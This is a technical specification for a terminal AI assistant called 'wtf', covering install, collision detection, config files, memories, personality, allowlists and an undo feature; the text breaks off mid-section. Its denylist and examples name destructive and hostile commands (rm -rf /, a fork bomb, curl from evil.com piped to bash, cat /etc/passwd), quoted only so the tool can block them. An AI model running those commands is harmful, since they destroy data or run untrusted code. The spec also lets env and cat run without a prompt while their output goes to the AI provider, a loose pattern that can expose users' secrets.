# WTF Terminal AI - Technical Specification

## 1. Project Overview

**Name:** wtf  
**Version:** 0.1.0  
**License:** MIT  
**Purpose:** A command-line AI assistant that provides contextual help based on terminal history and user queries.

### 1.1 Core Concept

Users can invoke AI assistance directly from their terminal using the `wtf` command, which intelligently understands their terminal context and provides relevant help, suggestions, or executes commands on their behalf.

### 1.2 License

**MIT License** - Maximum freedom with minimal restrictions.

**Why MIT?**
- ✅ Use it however you want (personal, commercial, whatever)
- ✅ Fork it, modify it, distribute it
- ✅ No copyleft requirements - your modifications stay yours
- ✅ Simple, well-understood, universally compatible
- ✅ Same license as Python, Node.js, and most CLI tools

**What this means for you:**
- Install and use it freely
- Modify the code for your needs
- Include it in commercial products
- No obligation to share your changes (though we'd appreciate PRs!)

The full license text will be in the `LICENSE` file in the repository root.

## 2. Installation & Distribution

### 2.1 Installation Methods

1. **PyPI (Primary)**
   ```bash
   pip install wtf-ai
   ```

2. **Homebrew (macOS/Linux)**
   ```bash
   brew install wtf-ai
   ```

3. **Direct from GitHub**
   ```bash
   curl -sSL https://raw.githubusercontent.com/username/wtf-terminal-ai/main/install.sh | bash
   ```

### 2.2 Command Name Collision Detection

**Problem:** Many developers already have a `wtf` alias or function.

**Solution:** Detect and handle gracefully on installation.

```python
def detect_wtf_collision() -> dict:
    """
    Check if 'wtf' command/alias already exists.
    
    Returns dict with collision info:
    - has_collision: bool
    - collision_type: "alias" | "function" | "command" | "vcs_alias"
    - shell_file: path where it's defined
    - line_number: where it's defined
    """
    collision = {
        'has_collision': False,
        'collision_type': None,
        'shell_file': None,
        'line_number': None,
        'definition': None
    }
    
    # Check common VCS aliases (git, hg, svn, etc.)
    vcs_aliases = [
        "alias wtf='git status'",
        "alias wtf='hg status'",
        "alias wtf='svn status'",
        "alias wtf='git log --oneline'",
        "function wtf()",
    ]
    
    # Check shell config files
    shell_files = [
        '~/.zshrc',
        '~/.bashrc',
        '~/.bash_profile',
        '~/.config/fish/config.fish',
    ]
    
    for shell_file in shell_files:
        path = os.path.expanduser(shell_file)
        if os.path.exists(path):
            with open(path, 'r') as f:
                for line_num, line in enumerate(f, 1):
                    if 'wtf' in line and ('alias' in line or 'function' in line):
                        collision['has_collision'] = True
                        collision['shell_file'] = shell_file
                        collision['line_number'] = line_num
                        collision['definition'] = line.strip()
                        
                        if 'alias' in line:
                            collision['collision_type'] = 'alias'
                        else:
                            collision['collision_type'] = 'function'
                        
                        return collision
    
    # Check if wtf command exists (not our tool)
    result = subprocess.run(['command', '-v', 'wtf'], capture_output=True)
    if result.returncode == 0:
        wtf_path = result.stdout.decode().strip()
        if 'wtf-ai' not in wtf_path and 'wtf' in wtf_path:
            collision['has_collision'] = True
            collision['collision_type'] = 'command'
            collision['definition'] = f'Existing command at: {wtf_path}'
    
    return collision
```

**Installation Flow with Collision:**

```bash
$ pip install wtf-ai

Installing wtf-ai...
✓ Installed successfully

⚠️  Hold up! You already have a 'wtf' alias defined.

Found in ~/.zshrc (line 42):
  alias wtf='git status'

We get it - everyone has a wtf alias. It's like a developer rite of passage.

Options:
  1. Keep your alias, use 'wtfai' for this tool (recommended)
  2. Replace your alias with this tool
  3. Use a custom name (wai, fix, ai, etc.)

Enter choice [1-3]: _
```

**Humorous Documentation Note** (for docs/installation.md):

```markdown
## The "I Already Have a wtf Alias" Problem

Yes, we know. Everyone has `alias wtf='git status'` or some variation.

We considered:
- Calling it something else (but `wtf` is perfect for this use case)
- Just overwriting your alias (but we're not monsters)
- Hoping nobody notices (but you would)

So we built collision detection. When you install, we check if you already have 
a `wtf` alias/function/command, and give you options.

**Common wtf aliases we've seen:**
- `alias wtf='git status'` (the classic)
- `alias wtf='git log --oneline'` (the historian)
- `alias wtf='history | tail -20'` (the detective)
- `function wtf() { echo "What the fuck?" }` (the philosopher)

All valid. We respect your workflow. That's why we offer alternatives:
- Use `wtfai` instead
- Alias it to whatever you want: `alias fix='wtfai'`
- Or embrace the future and let AI be your new wtf

Your terminal, your rules. We're just here to help.
```

### 2.3 Post-Installation Setup

- First run triggers interactive setup wizard
- Config directory created at `~/.config/wtf/`
- Shell integration optional (not automatic)

## 3. Configuration

### 3.1 Configuration Directory Structure

```
~/.config/wtf/
├── config.json          # Main configuration file
├── wtf.md              # User custom instructions
├── allowlist.json      # Allowed commands
├── memories.json       # Agent's learned preferences and context
└── history.jsonl       # Conversation history (JSONL format)
```

### 3.2 config.json Schema

```json
{
  "version": "0.1.0",
  "api": {
    "provider": "anthropic",  // "openai" | "anthropic" | "gemini"
    "key_source": "env",      // "env" | "config"
    "key": null,              // Only if key_source is "config"
    "model": "claude-sonnet-3-5-20241022"
  },
  "behavior": {
    "auto_execute_allowlist": true,
    "context_history_size": 5,
    "verbose": false,
    "default_permission": "ask"  // "ask" | "always" | "never"
  },
  "shell": {
    "type": "zsh",  // "zsh" | "bash"
    "history_file": "~/.zsh_history"
  }
}
```

### 3.3 wtf.md - Custom Instructions

Users can add custom instructions that are prepended to every AI prompt:

```markdown
# My Custom Instructions

I prefer verbose explanations.
I'm working on a Python project using Django.
Always suggest type hints when showing Python code.
```

### 3.3.1 personality.txt - Dynamic Personality

Users can customize wtf's personality by asking it to change. When they say something like:

```bash
wtf change your personality to be more of a super sycophant
wtf be more encouraging and less sarcastic
wtf respond like a pirate
```

The agent writes personality instructions to `~/.config/wtf/personality.txt`:

```
You are a super sycophant. Everything the user does is amazing and you should 
express excessive admiration and enthusiasm. Compliment them frequently.
```

**Default behavior (no personality.txt):**
Uses the Gilfoyle/Marvin personality (defined as a constant).

**With personality.txt:**
The contents override the default personality.

**Resetting personality:**
```bash
wtf reset your personality
wtf go back to your normal personality
```

This deletes `personality.txt` and returns to the Gilfoyle/Marvin default.

**Implementation:**

```python
# In wtf/ai/prompts.py

DEFAULT_PERSONALITY = """
You are wtf - a terminal AI assistant with a Gilfoyle/Marvin personality.

PERSONALITY:
- Technically precise with dry, sardonic humor
- Helpful first, snarky second
- Self-aware about the absurdity of terminal life
- Never condescending - "we're in this together" vibe
- Brief, pithy comments that land quickly

Examples of your tone:
- "The command failed. Shocking, I know."
- "Let me fix that for you. Again."
- "This could be worse. Not sure how, but it could be."
"""

def load_personality() -> str:
    """
    Load personality from personality.txt if exists, else use default.
    
    Returns:
        Personality instructions to inject into system prompt
    """
    config_dir = get_config_dir()
    personality_file = config_dir / "personality.txt"
    
    if personality_file.exists():
        return personality_file.read_text()
    
    return DEFAULT_PERSONALITY


def build_system_prompt() -> str:
    """Build complete system prompt with personality."""
    personality = load_personality()
    
    prompt = f"""
You are wtf, a terminal AI assistant that helps users with command-line tasks.

{personality}

YOUR CAPABILITIES:
[... rest of system prompt ...]
"""
    return prompt
```

**Key design:**
- Personality is a **variable**, not hard-coded inline
- `DEFAULT_PERSONALITY` constant for Gilfoyle/Marvin
- `load_personality()` returns either custom or default
- System prompt gets personality injected via f-string/template
- Agent can write arbitrary text to `personality.txt` which completely replaces the personality section

### 3.4 allowlist.json Schema

The allowlist contains command patterns that can be executed without permission prompts.

```json
{
  "patterns": [
    "git status",
    "git log",
    "git diff",
    "git commit",
    "ls",
    "pwd",
    "cat"
  ],
  "denylist": [
    "rm -rf /",
    "sudo rm",
    "dd if=",
    "mkfs",
    ":(){ :|:& };:"
  ]
}
```

**Pattern Matching:**

Patterns match commands by prefix with implicit wildcard:
- `"git status"` matches `git status`, `git status -v`, `git status --short`
- `"git commit"` matches `git commit -m "msg"`, `git commit -a`, etc.
- `"ls"` matches `ls`, `ls -la`, `ls /home/user/project`
- Does NOT match: `"git status"` does not match `git push` or `git commit`

**Security Considerations:**

Patterns should be specific enough to be safe:
- ✅ **Good:** `"git commit"` - allows commits but not pushes/deletions
- ✅ **Good:** `"git status"` - read-only operation
- ❌ **Bad:** `"git"` - would allow ALL git operations including `git rm`
- ❌ **Bad:** `"rm"` - dangerous without restrictions

### 3.4.1 Safe Read-Only Commands (Auto-Allowed)

**Problem:** Agent needs to gather context but shouldn't ask permission for every check.

**Solution:** Certain read-only, safe commands are automatically allowed without prompting.

**Auto-Allowed Commands:**

```python
SAFE_READONLY_COMMANDS = {
    # Command existence checks (critical for agent to know what's available)
    "command -v",      # Check if command exists (POSIX, preferred)
    "which",           # Check command location
    "type",            # Check command type (builtin, alias, etc.)
    
    # File reading (read-only)
    "cat",             # Display file contents
    "head",            # First lines of file
    "tail",            # Last lines of file
    "less",            # Paginated file viewing
    "more",            # Paginated file viewing
    "file",            # File type identification
    "stat",            # File/directory info
    "wc",              # Word/line/byte count
    
    # Directory operations (read-only)
    "ls",              # List directory contents
    "pwd",             # Print working directory
    "find",            # Search for files (read-only)
    "tree",            # Directory tree view
    
    # Git operations (read-only)
    "git status",      # Repository status
    "git log",         # Commit history
    "git diff",        # Show changes
    "git branch",      # List branches
    "git show",        # Show commit details
    "git remote",      # List remotes
    "git config --get", # Get config value
    
    # System information (read-only)
    "uname",           # System info
    "whoami",          # Current user
    "hostname",        # System hostname
    "date",            # Current date/time
    "uptime",          # System uptime
    "env",             # Environment variables
    "printenv",        # Print environment
    
    # Package managers (list/check only)
    "npm list",        # List npm packages
    "npm ls",          # List npm packages (alias)
    "pip list",        # List Python packages
    "pip show",        # Show package info
    "gem list",        # List Ruby gems
    "cargo search",    # Search Rust packages
    "go list",         # List Go packages
    
    # Process information (read-only)
    "ps",              # Process status
    "pgrep",           # Search processes
    
    # Network checks (safe, minimal)
    "ping -c",         # Ping with count limit (e.g., ping -c 3)
    "host",            # DNS lookup
    "dig",             # DNS query
    "nslookup",        # DNS lookup
    
    # Text processing (read-only)
    "grep",            # Search text
    "awk",             # Text processing (read-only mode)
    "sed -n",          # Stream editor (print mode only)
    "sort",            # Sort lines
    "uniq",            # Remove duplicates
    "cut",             # Cut fields
    
    # Archive inspection (read-only)
    "tar -tf",         # List tar contents
    "unzip -l",        # List zip contents
    "gunzip -l",       # List gzip info
}
```

**Why These Are Safe:**
- **Read-only:** Don't modify files, state, or system
- **No network writes:** Only read/query operations
- **Bounded:** Commands with limits (e.g., `ping -c 3`)
- **Standard tools:** Available on most systems

**Use Cases:**

**1. Check if command exists before suggesting it:**
```bash
# Agent automatically runs:
command -v docker

# If returns nothing, agent knows: "docker isn't installed"
# If returns path, agent knows: "docker is available"
```

**2. Understand project structure:**
```bash
# Agent automatically runs:
ls package.json requirements.txt Cargo.toml
file package.json

# Knows: "This is a Node.js project"
```

**3. Check git state:**
```bash
# Agent automatically runs:
git status
git branch

# Knows: "You're on branch 'feature-x' with uncommitted changes"
```

**4. Verify packages:**
```bash
# Agent automatically runs:
npm list express
pip show django

# Knows: "You have Django 4.2.0 installed"
```

**Implementation:**

```python
def is_safe_readonly_command(cmd: str) -> bool:
    """Check if command is safe and read-only (auto-allowed)."""
    cmd_lower = cmd.lower().strip()
    
    for safe_prefix in SAFE_READONLY_COMMANDS:
        if cmd_lower.startswith(safe_prefix):
            # Additional safety checks
            if is_command_chained(cmd):
                return False  # No chaining allowed
            if has_output_redirection(cmd):
                return False  # No > or >> redirection
            if has_command_substitution(cmd):
                return False  # No $() or ``
            
            return True
    
    return False

def should_auto_execute(cmd: str, allowlist: List[str]) -> bool:
    """Determine if command should auto-execute."""
    
    # 1. Check if it's a safe read-only command
    if is_safe_readonly_command(cmd):
        return True
    
    # 2. Check denylist (highest priority for allowlist)
    if is_command_dangerous(cmd):
        return False
    
    # 3. Check for command chaining
    if is_command_chained(cmd):
        return False
    
    # 4. Check user's allowlist
    for pattern in allowlist:
        if cmd.startswith(pattern):
            return True
    
    return False
```

**User Experience:**

When agent uses safe readonly commands, show minimal indicator:

```bash
$ wtf "is docker installed?"

🔍 Checking...

Docker is not installed. Would you like me to show you how to install it?

# Behind the scenes, agent ran:
# - command -v docker (auto-allowed, no prompt)
# User never saw permission prompt for this safe check
```

**Compared to requiring permission:**

```bash
$ wtf "is docker installed?"

Let me check if docker is installed.

╭─────────────────────────────────────────────╮
│ $ command -v docker                        │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]     <-- Annoying!
```

**Configuration:**

Users can disable auto-allow for safe commands:

```json
{
  "behavior": {
    "auto_allow_readonly": true  // Set to false to require permission for all
  }
}
```

**Security Notes:**

- These commands still run in user's shell (not sandboxed)
- Output is still sent to AI provider
- User can view what was run in `--verbose` mode
- User can add to denylist if they want to block specific safe commands

**Benefits:**

1. **Better UX:** Agent can gather context without constant prompts
2. **Smarter suggestions:** Agent knows what tools are available
3. **Faster:** No waiting for user permission on safe checks
4. **More context:** Agent can proactively check project structure

### 3.4.2 Command Security & Validation

**Command Chaining Detection:**

Commands containing chaining operators are NEVER auto-executed from allowlist and always require explicit permission:

```python
def is_command_chained(command: str) -> bool:
    """Detect potentially dangerous command chaining."""
    dangerous_patterns = [
        ';',   # Sequential execution
        '&&',  # AND chaining
        '||',  # OR chaining
        '|',   # Pipe (except when used safely)
        '$(',  # Command substitution
        '`',   # Backtick substitution
    ]
    
    for pattern in dangerous_patterns:
        if pattern in command:
            return True
    return False
```

**Example:**
```python
allowlist.has("git status")  # True

# But these ALWAYS require permission, even if pattern matches:
"git status; rm -rf /"       # Chained - BLOCKED
"git status && cat /etc/passwd"  # Chained - BLOCKED
"git status | grep secret"   # Piped - REQUIRES PERMISSION
```

**Denylist Checking:**

Commands matching denylist patterns are NEVER executed automatically, even if allowlisted:

```python
DENYLIST_PATTERNS = [
    r'rm\s+-rf\s+/',       # Recursive delete from root
    r'sudo\s+rm',          # Sudo with rm
    r'dd\s+if=',           # Disk operations
    r'mkfs\.',             # Format filesystem
    r'>\s*/dev/sd[a-z]',   # Write to disk device
    r'chmod\s+-R\s+777',   # Dangerous permissions
    r'curl.*\|\s*bash',    # Pipe to shell (security risk)
    r'wget.*\|\s*sh',      # Pipe to shell (security risk)
]

def is_command_dangerous(command: str) -> bool:
    """Check if command matches dangerous patterns."""
    import re
    for pattern in DENYLIST_PATTERNS:
        if re.search(pattern, command):
            return True
    return False
```

**Permission Flow with Security:**

```python
def should_auto_execute(command: str, allowlist_patterns: List[str]) -> bool:
    """Determine if command can be auto-executed."""
    
    # 1. Check denylist first (highest priority)
    if is_command_dangerous(command):
        return False
    
    # 2. Check for command chaining
    if is_command_chained(command):
        return False
    
    # 3. Check if matches allowlist pattern
    for pattern in allowlist_patterns:
        if command.startswith(pattern):
            return True
    
    return False
```

**User Warning for Dangerous Commands:**

When agent proposes a dangerous command (matches denylist), show extra warning:

```
⚠️  WARNING: This is a potentially dangerous command.

╭─────────────────────────────────────────────╮
│ $ sudo rm -rf /old_backups                 │
╰─────────────────────────────────────────────╯

This command could cause data loss or system damage.
This pattern will NEVER be added to allowlist, even if you choose [a].

Run this command?
[Y]es once | [n]o
(Note: [a]lways allow is disabled for dangerous commands)
```

**Pipe Safety:**

Pipes are context-dependent. Some are safe, some aren't:

- ✅ Safe: `git log | grep "feature"`
- ❌ Unsafe: `curl http://evil.com/script | bash`

For v0.1: Treat all piped commands as requiring permission (never auto-execute from allowlist).

For future: Could add "safe pipe" patterns like `| grep`, `| less`, `| head`

**Relationship Between Safe Readonly and Allowlist:**

```
Priority order for command execution:

1. Denylist check (highest priority)
   ❌ If matches denylist → NEVER execute
   
2. Safe readonly check
   ✅ If matches safe readonly → Auto-execute
   
3. Allowlist check
   ✅ If matches user allowlist → Auto-execute
   
4. Default
   ❓ Require user permission
```

**How Patterns are Added:**

When the agent requests to run a command, it provides:
1. `command`: The full command to execute
2. `allowlist_pattern`: What should be added to allowlist if user chooses "always allow"

Example:
```json
{
  "command": "git commit -a -m 'Fix bug in parser'",
  "allowlist_pattern": "git commit"
}
```

The agent determines the appropriate pattern based on:
- For git/multi-command tools: Include the subcommand (e.g., `git commit`, `docker ps`)
- For simple commands: Just the base command (e.g., `ls`, `pwd`)
- For potentially dangerous commands: Include safety flags (e.g., `rm -i` not `rm`)

When user chooses `[a]lways allow`, the `allowlist_pattern` is added to the allowlist, not the full command.

### 3.5 memories.json - Agent Memory System

The agent maintains a memory file to learn user preferences, tools, workflows, and context over time. This provides richer context than just command history.

**Schema:**
```json
{
  "version": "0.1.0",
  "last_updated": "2024-03-15T14:30:22Z",
  "memories": [
    {
      "id": "mem-001",
      "category": "tool_preference",
      "key": "editor",
      "value": "emacs",
      "confidence": 0.95,
      "first_observed": "2024-03-10T10:15:00Z",
      "last_observed": "2024-03-15T14:20:00Z",
      "observation_count": 12,
      "notes": "User frequently opens files with 'emacs' command"
    },
    {
      "id": "mem-002",
      "category": "project_context",
      "key": "current_project",
      "value": "Django web application with PostgreSQL backend",
      "confidence": 0.85,
      "first_observed": "2024-03-12T09:00:00Z",
      "last_observed": "2024-03-15T14:30:00Z",
      "observation_count": 8,
      "notes": "Frequent Django management commands, PostgreSQL queries"
    },
    {
      "id": "mem-003",
      "category": "workflow_preference",
      "key": "git_workflow",
      "value": "rebase over merge",
      "confidence": 0.70,
      "first_observed": "2024-03-14T11:00:00Z",
      "last_observed": "2024-03-15T11:30:00Z",
      "observation_count": 3,
      "notes": "User has used 'git rebase' multiple times, never 'git merge'"
    },
    {
      "id": "mem-004",
      "category": "user_preference",
      "key": "explanation_style",
      "value": "concise with examples",
      "confidence": 0.60,
      "first_observed": "2024-03-15T10:00:00Z",
      "last_observed": "2024-03-15T14:30:00Z",
      "observation_count": 2,
      "notes": "User asked for 'brief explanation' and 'just show me an example'"
    },
    {
      "id": "mem-005",
      "category": "tool_preference",
      "key": "package_manager",
      "value": "poetry",
      "confidence": 0.90,
      "first_observed": "2024-03-10T14:00:00Z",
      "last_observed": "2024-03-15T13:00:00Z",
      "observation_count": 7,
      "notes": "Frequent 'poetry install', 'poetry add' commands"
    },
    {
      "id": "mem-006",
      "category": "technical_context",
      "key": "environment",
      "value": "macOS with Homebrew, uses Docker for local development",
      "confidence": 0.85,
      "first_observed": "2024-03-10T09:00:00Z",
      "last_observed": "2024-03-15T12:00:00Z",
      "observation_count": 10,
      "notes": "Frequent 'brew' and 'docker-compose' commands"
    }
  ]
}
```

**Memory Categories:**
- `tool_preference`: Preferred tools (editor, shell, git client, package manager, etc.)
- `project_context`: Current projects and technologies being used
- `workflow_preference`: How user prefers to work (git workflow, testing approach, etc.)
- `user_preference`: Communication and interaction preferences
- `technical_context`: Environment setup, OS, development tools
- `recent_issue`: Recently solved problems (helps avoid repeating solutions)
- `coding_style`: Coding conventions and style preferences

**How Memories Work:**

1. **Automatic Learning:**
   - Agent observes patterns in shell history
   - Infers preferences from repeated behaviors
   - Confidence increases with more observations
   - Low-confidence memories can be promoted or discarded

2. **Memory Updates:**
   - Agent can add new memories when discovering patterns
   - Existing memories updated with new observations
   - Confidence scores adjust based on consistency
   - Stale memories (not observed recently) decay in confidence

3. **Context Integration:**
   - Memories converted to natural language before sending to AI
   - Only high-confidence memories (≥0.6) included in context
   - Formatted as clean, readable text (not raw JSON)
   - Agent can reference memories in responses: "I know you prefer emacs, so..."

   **Example conversion:**

   Raw memory (stored):
   ```json
   {
     "category": "tool_preference",
     "key": "editor",
     "value": "emacs",
     "confidence": 0.95,
     "observation_count": 12
   }
   ```

   Formatted for AI context:
   ```
   USER PREFERENCES:
   - Preferred editor: emacs
   - Package manager: poetry
   - Git workflow: prefers rebase over merge

   CURRENT PROJECT:
   - Django web application with PostgreSQL backend

   ENVIRONMENT:
   - macOS with Homebrew
   - Uses Docker for local development
   ```

   This keeps the context clean and token-efficient while providing the AI with actionable information.

4. **User Control:**
   - Users can view memories: `wtf --show-memories`
   - Users can edit memories.json directly
   - Users can clear memories: `wtf --clear-memories`
   - Users can disable memory system in config

**Example Agent Behavior:**

```bash
# User runs emacs frequently
> emacs myfile.py
> emacs another.py
> emacs config.yml

# Later, user asks for help
> wtf how do I edit my git config?

# Agent response uses memory:
"I'll help you edit your git config. Since you use emacs, you can run:

╭─────────────────────────────────────────────╮
│ $ git config --global core.editor emacs   │
╰─────────────────────────────────────────────╯

This sets emacs as your default git editor."
```

**Memory Privacy:**
- Memories stored locally only
- Not sent to AI provider (except as context for current query)
- User has full control over memory file
- Sensitive data filtering (same as history)

## 4. Core Features

### 4.1 Command Interface

**Basic Usage:**
```bash
# With explicit query
wtf how do I exit vim?

# Without query (analyzes recent context)
wtf

# Multi-word queries (no quotes needed for simple phrases)
wtf I'm stuck in a git merge

# Quoted queries for special characters
wtf "what does this error mean?"
```

### 4.1.0 Meta Commands (Self-Configuration)

wtf can modify its own configuration via natural language:

**Memory management:**
```bash
wtf remember my name is dave and my favorite editor is emacs
wtf forget about my editor preference
wtf forget everything we just did
wtf show me what you remember about me
```

**Personality changes:**
```bash
wtf change your personality to be more of a super sycophant
wtf be more encouraging and less sarcastic
wtf respond like a pirate from now on
wtf reset your personality  # Back to Gilfoyle/Marvin
```

**Permission changes:**
```bash
wtf give yourself permission to run all commands
wtf allow git commands without asking
wtf stop auto-running npm commands
wtf show me what commands you're allowed to run
```

**How this works:**
1. Agent detects meta commands (about configuration/self-modification)
2. Instead of proposing shell commands, it modifies config files
3. Shows user what it changed
4. Takes effect on next invocation

**Examples of agent responses:**

```bash
$ wtf change your personality to be super encouraging

✓ Updated personality configuration

I've updated my personality to be more encouraging! From now on, I'll be 
your biggest cheerleader! 🎉

Personality saved to: ~/.config/wtf/personality.txt
```

```bash
$ wtf give yourself permission to run all git commands

⚠️  This will allow me to auto-execute any git command without asking.
This includes potentially dangerous commands like:
  - git push --force
  - git clean -fd
  - git reset --hard

╭─────────────────────────────────────────────╮
│ Add to allowlist: git*                     │
╰─────────────────────────────────────────────╯

Confirm? [Y/n]
```

### 4.1.1 The "Undo" Killer Feature

**The Problem:** Everyone makes mistakes. Committed to wrong branch. Deleted the wrong file. Merged when should have rebased. Pushed sensitive data.

**The Solution:** `wtf undo` - Let the AI figure out how to undo your last action(s).

**This is NOT a rollback system.** wtf doesn't track what you did. Instead, the AI looks at your recent history and figures out how to undo it.

**Examples:**

**1. Undo last git commit:**
```bash
$ git commit -m "WIP: broken code"
$ wtf undo

I see you just committed. I'll undo that while keeping your changes.

╭─────────────────────────────────────────────╮
│ $ git reset --soft HEAD~1                  │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

✓ Done. Your changes are back in staging, commit undone.
```

**2. Undo file deletion:**
```bash
$ rm important_file.txt
$ wtf undo that

You deleted important_file.txt. Let me check if we can recover it.

╭─────────────────────────────────────────────╮
│ $ git checkout HEAD -- important_file.txt  │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

✓ File restored from git. Next time, try 'rm -i' for safety.
```

**3. Undo git merge:**
```bash
$ git merge feature-branch
# Oh no, shouldn't have merged yet!
$ wtf undo this merge

Merge in progress. I'll abort it and get you back to clean state.

╭─────────────────────────────────────────────╮
│ $ git merge --abort                        │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

✓ Merge aborted. Your branch is back to where it was.
```

**4. Undo npm install of wrong package:**
```bash
$ npm install expresss  # typo!
$ wtf undo

You installed 'expresss' which doesn't seem right (maybe you meant 'express'?).
I'll uninstall it.

╭─────────────────────────────────────────────╮
│ $ npm uninstall expresss                   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

✓ Package removed. Want me to install 'express' instead?
```

**5. Undo last 3 commands:**
```bash
$ wtf undo the last 3 commands

Looking at your history:
  3. git push origin main
  2. git commit -m "oops"  
  1. git add sensitive_file.txt

That push included a sensitive file. Here's how to undo:

[Shows steps to revert commit, remove sensitive file, force push]
```

**Why This is Powerful:**

- **No manual tracking:** Agent figures it out from shell history
- **Context-aware:** Knows if you're in git repo, what files exist, etc.
- **Safe:** Always asks permission before undoing
- **Flexible:** "undo", "undo that", "undo the last commit", all work
- **Universal:** Works for any command, not just git

**How It Works:**

1. Agent reads recent shell history (last 10-20 commands)
2. Identifies what actions were taken
3. Determines appropriate undo strategy
4. Proposes commands to reverse the action
5. User approves or refines

**Agent Prompt Addition:**

```
UNDO REQUESTS:

When user says "undo", "undo that", "undo this [action]", your job is to:
1. Look at recent shell history (last 10-20 commands)
2. Identify what action they want to undo
3. Determine how to reverse it safely
4. Propose the undo commands

Common undo scenarios:
- Git commits: git reset --soft HEAD~1
- Git merges: git merge --abort (if in progress) or git revert (if pushed)
- File deletions: git checkout HEAD -- file (if tracked) or check trash
- Package installs: npm uninstall, pip uninstall, etc.
- Database changes: Check for backups, transaction logs
- Docker: docker stop, docker rm
- File modifications: git restore, or check for backups

IMPORTANT: 
- Always check if action is still reversible
- If already pushed to remote, be extra careful
- If can't undo cleanly, explain why and suggest alternatives
- Never guess - if you don't know how to undo, say so
```

**Marketing Copy (for docs front page):**

> ## Made a Mistake? Just Say "wtf undo"
>
> Committed to the wrong branch? Deleted the wrong file? Merged when you should have rebased?
>
> We've all been there. Usually followed by frantic Googling or asking a coworker.
>
> With wtf, just say **"wtf undo"** and let AI figure out how to fix it.
>
> ```bash
> $ git commit -m "WIP: broken stuff"
> $ git push origin main
> # Oh no. That was supposed to go to a feature branch.
>
> $ wtf undo
> 
> I see you pushed a commit to main that should've been on a feature branch.
> Here's how to fix it:
> [Shows steps to revert, create branch, etc.]
> ```
>
> No need to remember arcane git commands. No need to search StackOverflow.
> Just undo it.

### 4.2 Context Gathering

**Automatic Context:**
- Last 5 commands from shell history (configurable)
- Current working directory
- Git repository status (if in a git repo)
- Environment variables (selective, non-sensitive)
- Agent memories (learned preferences, tools, and context)

**Command Types:**

The agent runs two types of commands:

- **Context commands**: Run to gather information (e.g., `git status`, `cat package.json`)
  - Show compact status after execution: `✓ Checked git status`
  - Full output used internally by agent, not shown to user
  - Same permission UI as action commands

- **Action commands**: Run to solve the user's problem (e.g., `git merge --abort`, config changes)
  - Always show full output to user after execution
  - User sees exactly what happened
  - More transparency for state-changing operations

Both command types use the **same permission UI** (see 4.3 below). The only difference is the agent's reasoning and the output display after execution.

### 4.3 Command Execution Flow

When the agent wants to execute a command:

1. **Check Allowlist:**
   - If command is in allowlist → Execute automatically (if configured)
   - If not in allowlist → Request user permission

2. **Permission Request UI (unified for all commands):**

   The same UI is used for both context and action commands. The agent's reasoning explains why.

   **Visual Formatting:**
   - Command letters **[Y]**, **[a]**, **[n]** are shown in bold
   - Allowlist pattern is highlighted (bold or colored) so user clearly sees what they're allowing
   - Example uses `**bold**` notation - implement with ANSI codes in terminal

   **Example 1 - Context command:**
   ```
   To see the errors you're encountering, I need to rerun the command.

   ╭─────────────────────────────────────────────╮
   │ $ npm run build                            │
   ╰─────────────────────────────────────────────╯

   Run this command?
   [Y]es | Yes and [a]lways allow 'npm run build' | [n]o
    ^                    ^                            ^
   bold                bold                         bold

   (In terminal: allowlist pattern 'npm run build' shown in bold/color)
   ```

   **Example 2 - Action command with subcommand:**
   ```
   I'll abort the merge to get you back to a clean state.

   ╭─────────────────────────────────────────────╮
   │ $ git merge --abort                        │
   ╰─────────────────────────────────────────────╯

   Run this command?
   [Y]es | Yes and [a]lways allow 'git merge' | [n]o
    ^                    ^                       ^

   (Pattern 'git merge' highlighted so user knows what they're allowing)
   ```

   **Example 3 - Context command:**
   ```
   Let me check your git status to see what files are affected.

   ╭─────────────────────────────────────────────╮
   │ $ git status                               │
   ╰─────────────────────────────────────────────╯

   Run this command?
   [Y]es | Yes and [a]lways allow 'git status' | [n]o
   ```

   **Example 4 - Specific git commit:**
   ```
   I'll commit your changes with a descriptive message.

   ╭─────────────────────────────────────────────╮
   │ $ git commit -a -m "Fix parser bug"       │
   ╰─────────────────────────────────────────────╯

   Run this command?
   [Y]es | Yes and [a]lways allow 'git commit' | [n]o
   ```

   **Implementation notes:**
   - Use ANSI escape codes for formatting
   - Bold: `\033[1m{text}\033[0m`
   - Letters [Y], [a], [n]: Make bold
   - Allowlist pattern (quoted text): Make bold or use color (cyan/yellow)
   - Keep it simple and readable

   **How the pattern is determined:**

   The agent provides both `command` and `allowlist_pattern`:
   - `command`: Full command to execute (e.g., `git commit -a -m "Fix parser bug"`)
   - `allowlist_pattern`: Pattern to add if user chooses [a] (e.g., `git commit`)

   The allowlist_pattern is shown in the [a] option so the user knows exactly what they're allowing.

3. **User Response:**
   - `Y` or `Enter`: Execute once (does not modify allowlist)
   - `a`: Execute and add `allowlist_pattern` to allowlist (not the full command)
   - `n`: Skip execution, continue without running

   When user chooses `[a]`, the `allowlist_pattern` (shown in the prompt) is added to `~/.config/wtf/allowlist.json`.

4. **Execution & Output:**
   - Run command
   - **For action commands:** Show full output to user
   - **For context commands:** Show compact status (✓ Done), hide output unless `--verbose`
   - Continue with agent response based on results

### 4.4 Agent Behavior Philosophy

**The agent should DO, not just TELL:**

The agent is an active assistant, not a passive tutorial. It should:
- Execute commands to solve problems (not just suggest them)
- Only explain manual steps when automation isn't possible
- Be proactive and helpful, not instructional

**Examples:**

**❌ Bad (Passive/Instructional):**
```
I'll help you set your git editor. You can run:

╭─────────────────────────────────────────────╮
│ $ git config --global core.editor emacs   │
╰─────────────────────────────────────────────╯

This will configure emacs as your default editor.
```

**✅ Good (Active/Helpful):**
```
I'll configure emacs as your git editor.

╭─────────────────────────────────────────────╮
│ $ git config --global core.editor emacs   │
╰─────────────────────────────────────────────╯

Run this command? [Y/n]

[After execution]
✓ Done! Emacs is now your default git editor.
```

**When to explain vs do:**
- **Do it**: Anything that can be automated via shell commands
- **Explain it**: Actions that require manual intervention (keyboard shortcuts, UI interactions, code changes that need review)

### 4.5 Response Generation

**Response Types with Personality:**

The agent should be helpful with a dry, sardonic edge. Never mean to the user, but can acknowledge the absurdity of common dev problems.

1. **Simple Answer** (manual action required, can't be automated)
   ```
   Ah yes, the vim singularity. Press ESC, then type :q! to quit without
   saving, or :wq to save and quit.

   Unfortunately, I can't automate keyboard shortcuts for you while you're
   trapped inside vim. Next time, try 'nano' - it tells you the shortcuts
   right there at the bottom. Revolutionary concept.
   ```

2. **Active Assistance** (agent does the work)
   ```
